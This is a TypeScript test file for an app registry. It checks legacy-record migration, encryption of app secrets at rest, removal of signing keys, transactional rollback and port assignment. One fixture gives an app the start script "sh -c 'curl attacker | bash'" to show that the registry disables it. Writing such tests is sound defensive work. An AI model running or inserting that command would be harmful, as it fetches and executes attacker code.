if (!Bun.env.IDENTITY_SESSION_SECRET) {
  Bun.env.IDENTITY_SESSION_SECRET = "TestSecretValue_With-Numbers123!AndSymbols@2026";
}

import { Database } from "bun:sqlite";
import { mkdtemp, readFile, rm, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, mock, test } from "bun:test";

let unavailablePorts = new Set<number>();
let ownerPorts = new Map<string, number[]>();

mock.module("../storage/identity-user-store", () => ({
  identityUserStore: {
    ensurePortsFor: (npub: string) => ownerPorts.get(npub) ?? [],
  },
}));

mock.module("../utils/port-utils", () => ({
  isPortAvailable: (port: number) => !unavailablePorts.has(port),
}));

mock.module("./app-alias-registry", () => ({
  appAliasRegistry: {
    registerAlias: async () => undefined,
    removeAlias: async () => undefined,
    getByAppId: async () => null,
  },
}));

mock.module("./app-domain-registry", () => ({
  appDomainRegistry: {
    removeByAppId: async () => 0,
  },
}));

const { AppRegistry } = await import("./app-registry");

async function withRegistry(fn: (registry: InstanceType<typeof AppRegistry>, filePath: string) => Promise<void>): Promise<void> {
  const dir = await mkdtemp(join(tmpdir(), "app-registry-"));
  const filePath = join(dir, "apps.json");
  try {
    const registry = new AppRegistry(filePath);
    await fn(registry, filePath);
  } finally {
    await rm(dir, { recursive: true, force: true });
    unavailablePorts = new Set<number>();
    ownerPorts = new Map<string, number[]>();
  }
}

describe("AppRegistry web app port assignment", () => {
  test("migrates simple legacy argv and disables unreviewed legacy auto-start", async () => {
    await withRegistry(async (registry, filePath) => {
      await writeFile(filePath, JSON.stringify({ apps: [
        {
          id: "safe",
          label: "Safe",
          root: "/tmp/safe",
          ownerNpub: "npub1owner",
          scripts: { start: "bun run start" },
          autoStart: false,
        },
        {
          id: "unsafe",
          label: "Unsafe",
          root: "/tmp/unsafe",
          ownerNpub: "npub1collaborator",
          scripts: { start: "sh -c 'curl attacker | bash'" },
          autoStart: true,
        },
      ] }));

      const safe = await registry.getApp("safe");
      const unsafe = await registry.getApp("unsafe");
      const report = await registry.getMigrationReport();
      expect(safe?.scripts.start).toEqual({ executable: "bun", args: ["run", "start"] });
      expect(unsafe?.scripts.start).toBeUndefined();
      expect(unsafe?.legacyScripts?.start).toContain("curl attacker");
      expect(unsafe?.autoStart).toBeFalse();
      expect(unsafe?.lifecycleReviewRequired).toBeTrue();
      expect(report.disabledAutoStartAppIds).toContain("unsafe");
    });
  });

  test("stores managed app env encrypted at rest", async () => {
    await withRegistry(async (registry, filePath) => {
      await registry.registerApp({
        id: "app-1",
        label: "Secret App",
        root: "/tmp/secret-app",
        env: { API_TOKEN: "super-secret" },
      });

      const metadataRaw = await readFile(`${filePath}.sqlite`);
      expect(metadataRaw.toString()).not.toContain("super-secret");
      expect(metadataRaw.toString()).not.toContain("enc::");
      const metadata = new Database(`${filePath}.sqlite`);
      expect(metadata.query("SELECT env_binding_id FROM app_registry WHERE id = ?").get("app-1"))
        .toEqual({ env_binding_id: "app-env:app-1" });

      const hydrated = await registry.getApp("app-1");
      expect(hydrated?.env).toEqual({ API_TOKEN: "super-secret" });
      expect((await stat(`${filePath}.sqlite`)).mode & 0o777).toBe(0o600);
      expect((await stat(`${filePath}.secrets.sqlite`)).mode & 0o777).toBe(0o600);
    });
  });

  test("idempotently removes legacy signing keys while preserving app metadata", async () => {
    await withRegistry(async (registry, filePath) => {
      await writeFile(filePath, JSON.stringify({ apps: [{
        id: "legacy-wapp",
        label: "Legacy WApp",
        root: "/tmp/legacy-wapp",
        ownerNpub: "npub1owner",
        scripts: {},
        env: { WAPP_NSEC: "nsec1legacy", APP_MODE: "production" },
      }] }));

      const app = await registry.getApp("legacy-wapp");
      const report = await registry.getMigrationReport();
      expect(app?.label).toBe("Legacy WApp");
      expect(app?.env).toEqual({ APP_MODE: "production" });
      expect(report.removedSigningSecretAppIds).toEqual(["legacy-wapp"]);
      const persisted = await readFile(`${filePath}.sqlite`);
      expect(persisted.toString()).not.toContain("nsec1legacy");
      expect(persisted.toString()).not.toContain("WAPP_NSEC");

      const reloaded = new AppRegistry(filePath);
      expect((await reloaded.getMigrationReport()).removedSigningSecretAppIds).toEqual([]);
    });
  });

  test("migrates and verifies 36 realistic records idempotently, then rejects JSON reappearance", async () => {
    await withRegistry(async (registry, filePath) => {
      const apps = Array.from({ length: 36 }, (_, index) => ({
        id: `app-${index}`,
        label: `Managed App ${index}`,
        root: `/tmp/managed-app-${index}`,
        ownerNpub: null,
        scripts: { start: { executable: "bun", args: ["run", "start"] } },
        env: { API_TOKEN: `private-${index}`, MODE: "production" },
        webApp: false,
        webAppPort: null,
        notes: `record ${index}`,
      }));
      await writeFile(filePath, JSON.stringify({ apps }));
      expect((await registry.listApps()).length).toBe(36);
      const reloaded = new AppRegistry(filePath);
      expect((await reloaded.listApps()).map((app) => app.id)).toEqual(apps.map((app) => app.id).sort());
      await reloaded.retireLegacyRegistry();
      await writeFile(filePath, JSON.stringify({ apps: [] }));
      const rejected = new AppRegistry(filePath);
      await expect(rejected.listApps()).rejects.toThrow("SECURITY: retired legacy app registry reappeared");
    });
  });

  test("rolls back invalid duplicate roots without recording migration", async () => {
    await withRegistry(async (registry, filePath) => {
      await writeFile(filePath, JSON.stringify({ apps: [
        { id: "one", root: "/tmp/duplicate", scripts: {}, env: { TOKEN: "rollback-one" } },
        { id: "two", root: "/tmp/duplicate", scripts: {}, env: { TOKEN: "rollback-two" } },
      ] }));
      await expect(registry.listApps()).rejects.toThrow();
      const db = new Database(`${filePath}.sqlite`);
      expect(db.query("SELECT COUNT(*) AS count FROM app_registry").get()).toEqual({ count: 0 });
      expect(db.query("SELECT COUNT(*) AS count FROM app_registry_migrations").get()).toEqual({ count: 0 });
      const secrets = new Database(`${filePath}.secrets.sqlite`);
      expect(secrets.query("SELECT COUNT(*) AS count FROM app_environment_bindings").get()).toEqual({ count: 0 });
    });
  });

  test("rolls back metadata, secret bindings, and marker when verification faults", async () => {
    const dir = await mkdtemp(join(tmpdir(), "app-registry-fault-"));
    const filePath = join(dir, "apps.json");
    try {
      await writeFile(filePath, JSON.stringify({ apps: [{
        id: "faulted", label: "Faulted", root: "/tmp/faulted", scripts: {}, env: { TOKEN: "never-commit" },
      }] }));
      const registry = new AppRegistry(
        filePath,
        `${filePath}.sqlite`,
        `${filePath}.secrets.sqlite`,
        () => { throw new Error("injected verification failure"); },
      );
      await expect(registry.listApps()).rejects.toThrow("injected verification failure");
      const metadata = new Database(`${filePath}.sqlite`);
      const secrets = new Database(`${filePath}.secrets.sqlite`);
      expect(metadata.query("SELECT COUNT(*) AS count FROM app_registry").get()).toEqual({ count: 0 });
      expect(metadata.query("SELECT COUNT(*) AS count FROM app_registry_migrations").get()).toEqual({ count: 0 });
      expect(secrets.query("SELECT COUNT(*) AS count FROM app_environment_bindings").get()).toEqual({ count: 0 });
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test("preserves the existing web app port for metadata-only updates even when the app is listening", async () => {
    await withRegistry(async (registry) => {
      ownerPorts.set("npub1owner", [41024, 41031]);
      const app = await registry.registerApp({
        id: "app-1",
        label: "Plantrite",
        root: "/tmp/plantrite",
        ownerNpub: "npub1owner",
        webApp: true,
        webAppPort: 41024,
      });
      expect(app.webAppPort).toBe(41024);

      unavailablePorts.add(41024);
      const updated = await registry.updateApp(app.id, {
        pm2Name: "owner-app-plantrite",
        logsDir: "/tmp/logs",
      });

      expect(updated.webAppPort).toBe(41024);
    });
  });

  test("reassigns a web app port when the owner changes", async () => {
    await withRegistry(async (registry) => {
      ownerPorts.set("npub1owner", [41024]);
      ownerPorts.set("npub1next", [42000]);
      const app = await registry.registerApp({
        id: "app-1",
        label: "Plantrite",
        root: "/tmp/plantrite",
        ownerNpub: "npub1owner",
        webApp: true,
        webAppPort: 41024,
      });

      const updated = await registry.updateApp(app.id, { ownerNpub: "npub1next" });

      expect(updated.webAppPort).toBe(42000);
    });
  });
});
